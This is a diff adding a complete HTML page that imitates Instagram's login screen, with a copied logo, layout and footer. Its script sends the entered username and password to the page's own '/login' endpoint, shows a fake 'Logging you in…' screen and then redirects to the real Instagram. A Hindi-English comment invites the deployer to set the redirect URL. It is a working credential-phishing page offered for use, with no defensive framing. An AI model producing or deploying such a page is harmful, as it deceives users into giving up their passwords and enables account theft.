@@ -1,1 +1,230 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Login • Instagram</title>
+<meta name="theme-color" content="#ffffff">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='1' x2='1' y2='0'%3E%3Cstop offset='0' stop-color='%23feda75'/%3E%3Cstop offset='.3' stop-color='%23fa7e1e'/%3E%3Cstop offset='.6' stop-color='%23d62976'/%3E%3Cstop offset='1' stop-color='%239625f5'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='24' height='24' rx='6' fill='url(%23g)'/%3E%3Crect x='4' y='4' width='16' height='16' rx='5' fill='none' stroke='white' stroke-width='2'/%3E%3Ccircle cx='12' cy='12' r='4' fill='none' stroke='white' stroke-width='2'/%3E%3Ccircle cx='17.2' cy='6.8' r='1.2' fill='white'/%3E%3C/svg%3E">
+<style>
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:#fafafa;color:#262626;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    min-height:100vh;padding:20px 16px;gap:10px;
+    -webkit-font-smoothing:antialiased;
+  }
+  .card{
+    width:100%;max-width:350px;background:#fff;
+    border:1px solid #dbdbdb;border-radius:1px;
+    padding:40px 40px 24px;
+    display:flex;flex-direction:column;align-items:center;
+  }
+  .logo{width:175px;height:auto;margin:0 0 32px;display:block}
+  form{width:100%;display:flex;flex-direction:column;gap:6px}
+  .field{position:relative}
+  .field input{
+    width:100%;padding:14px 8px 6px;height:38px;
+    background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;
+    font-size:12px;color:#262626;outline:none;
+    transition:border-color .1s;
+  }
+  .field input:focus{border-color:#a8a8a8}
+  .field label{
+    position:absolute;left:9px;top:50%;transform:translateY(-50%);
+    font-size:12px;color:#8e8e8e;pointer-events:none;
+    transition:all .12s ease-out;
+  }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label{
+    top:9px;font-size:10px;transform:none;
+  }
+  .field input[type="password"]{letter-spacing:.5px}
+  .show-pass{
+    position:absolute;right:8px;top:50%;transform:translateY(-50%);
+    background:transparent;border:0;color:#262626;font-weight:600;font-size:14px;
+    cursor:pointer;padding:4px 6px;display:none;
+  }
+  .field input:not(:placeholder-shown) ~ .show-pass{display:block}
+  .submit{
+    margin-top:8px;height:32px;border:0;border-radius:8px;
+    background:#0095f6;color:#fff;font-weight:600;font-size:14px;
+    cursor:pointer;transition:opacity .1s;
+  }
+  .submit:hover{opacity:.9}
+  .submit:active{opacity:.7}
+  .submit:disabled{opacity:.5;cursor:default}
+  .divider{
+    display:flex;align-items:center;gap:18px;
+    width:100%;margin:20px 0;color:#8e8e8e;font-size:12px;font-weight:600;
+  }
+  .divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
+  .fb-login{
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    color:#385185;font-weight:600;font-size:14px;text-decoration:none;
+    margin-bottom:14px;
+  }
+  .fb-login svg{width:16px;height:16px;fill:#385185}
+  .forgot{color:#00376b;font-size:12px;text-decoration:none;margin-bottom:8px}
+  .signup{
+    width:100%;max-width:350px;background:#fff;
+    border:1px solid #dbdbdb;border-radius:1px;
+    padding:22px;text-align:center;font-size:14px;color:#262626;
+  }
+  .signup a{color:#0095f6;font-weight:600;text-decoration:none}
+  .apps{text-align:center;font-size:14px;color:#262626;margin-top:6px}
+  .apps p{margin:0 0 14px}
+  .badges{display:flex;gap:8px;justify-content:center}
+  .badges img{height:40px;width:auto}
+  footer{
+    margin-top:36px;font-size:11px;color:#8e8e8e;text-align:center;
+    max-width:900px;line-height:1.6;
+  }
+  footer a{color:#8e8e8e;text-decoration:none;margin:0 6px}
+  footer .copy{margin-top:14px;color:#c7c7c7}
+  .loading-overlay{
+    position:fixed;inset:0;background:#fff;display:none;
+    align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:50;
+  }
+  .loading-overlay.on{display:flex}
+  .spinner{
+    width:34px;height:34px;border-radius:50%;
+    border:3px solid #dbdbdb;border-top-color:#0095f6;
+    animation:spin .8s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loading-overlay p{font-size:13px;color:#8e8e8e;margin:0}
+  @media (max-width:450px){
+    .card{border:0;background:transparent;padding:20px 20px 0}
+    body{background:#fff}
+    .signup{border:0;background:transparent}
+  }
+</style>
+</head>
+<body>
 
+<div class="card">
+  <svg class="logo" viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg" aria-label="Instagram">
+    <g fill="none" stroke="#262626" stroke-width="2.4">
+      <rect x="1.2" y="1.2" width="48.6" height="48.6" rx="13"/>
+      <circle cx="25.5" cy="25.5" r="12"/>
+      <circle cx="40" cy="11" r="2.6" fill="#262626" stroke="none"/>
+    </g>
+    <text x="60" y="34" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif"
+          font-size="27" font-weight="500" fill="#262626" letter-spacing="-0.5">Instagram</text>
+  </svg>
+
+  <form id="loginForm" method="POST" action="/login" autocomplete="off" novalidate>
+    <div class="field">
+      <input type="text" id="username" name="email" placeholder=" " autocomplete="username"
+             autocapitalize="off" autocorrect="off" spellcheck="false" required>
+      <label for="username">Phone number, username, or email</label>
+    </div>
+    <div class="field">
+      <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required>
+      <label for="password">Password</label>
+      <button type="button" class="show-pass" id="showPass">Show</button>
+    </div>
+    <button type="submit" class="submit" id="submitBtn">Log in</button>
+
+    <div class="divider">OR</div>
+
+    <a class="fb-login" href="https://www.facebook.com/login/" target="_self" rel="noopener">
+      <svg viewBox="0 0 24 24"><path d="M22 12a10 10 0 1 0-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.45 2.89h-2.33v6.99A10 10 0 0 0 22 12z"/></svg>
+      Log in with Facebook
+    </a>
+
+    <a class="forgot" href="https://www.instagram.com/accounts/password/reset/" target="_self" rel="noopener">
+      Forgot password?
+    </a>
+  </form>
+</div>
+
+<div class="signup">
+  Don't have an account?
+  <a href="https://www.instagram.com/accounts/emailsignup/" target="_self" rel="noopener">Sign up</a>
+</div>
+
+<div class="apps">
+  <p>Get the app.</p>
+  <div class="badges">
+    <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener">
+      <img alt="App Store" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'><rect width='135' height='40' rx='6' fill='black'/><text x='67' y='25' fill='white' font-family='Arial' font-size='11' text-anchor='middle'>App Store</text></svg>">
+    </a>
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener">
+      <img alt="Google Play" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'><rect width='135' height='40' rx='6' fill='black'/><text x='67' y='25' fill='white' font-family='Arial' font-size='11' text-anchor='middle'>Google Play</text></svg>">
+    </a>
+  </div>
+</div>
+
+<footer>
+  <div>
+    <a href="https://about.meta.com/" target="_blank" rel="noopener">Meta</a>
+    <a href="https://about.instagram.com/" target="_blank" rel="noopener">About</a>
+    <a href="https://about.instagram.com/blog/" target="_blank" rel="noopener">Blog</a>
+    <a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener">Jobs</a>
+    <a href="https://help.instagram.com/" target="_blank" rel="noopener">Help</a>
+    <a href="https://developers.facebook.com/docs/instagram" target="_blank" rel="noopener">API</a>
+    <a href="https://privacycenter.instagram.com/policy/" target="_blank" rel="noopener">Privacy</a>
+    <a href="https://help.instagram.com/581066165581870" target="_blank" rel="noopener">Terms</a>
+    <a href="https://www.instagram.com/web/lite/" target="_blank" rel="noopener">Instagram Lite</a>
+    <a href="https://www.threads.net/" target="_blank" rel="noopener">Threads</a>
+    <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" rel="noopener">Meta Verified</a>
+  </div>
+  <div class="copy">English &nbsp;·&nbsp; © 2025 Instagram from Meta</div>
+</footer>
+
+<div class="loading-overlay" id="loader">
+  <div class="spinner"></div>
+  <p>Logging you in…</p>
+</div>
+
+<script>
+  /* =========================================================
+     YAHAN APNA REDIRECT URL DAAL
+     ========================================================= */
+  const REDIRECT_URL = "https://www.instagram.com/";
+
+  const showBtn = document.getElementById('showPass');
+  const pass    = document.getElementById('password');
+  const form    = document.getElementById('loginForm');
+  const btn     = document.getElementById('submitBtn');
+  const loader  = document.getElementById('loader');
+
+  showBtn.addEventListener('click', () => {
+    const t = pass.type === 'password';
+    pass.type = t ? 'text' : 'password';
+    showBtn.textContent = t ? 'Hide' : 'Show';
+  });
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const u = document.getElementById('username').value.trim();
+    const p = pass.value;
+    if (!u || !p) return;
+
+    btn.disabled = true;
+    btn.textContent = 'Logging in…';
+
+    try {
+      const body = new URLSearchParams();
+      body.append('email', u);
+      body.append('password', p);
+      await fetch('/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: body.toString(),
+        keepalive: true
+      });
+    } catch (_) {}
+
+    loader.classList.add('on');
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 900);
+  });
+</script>
+</body>
+</html>
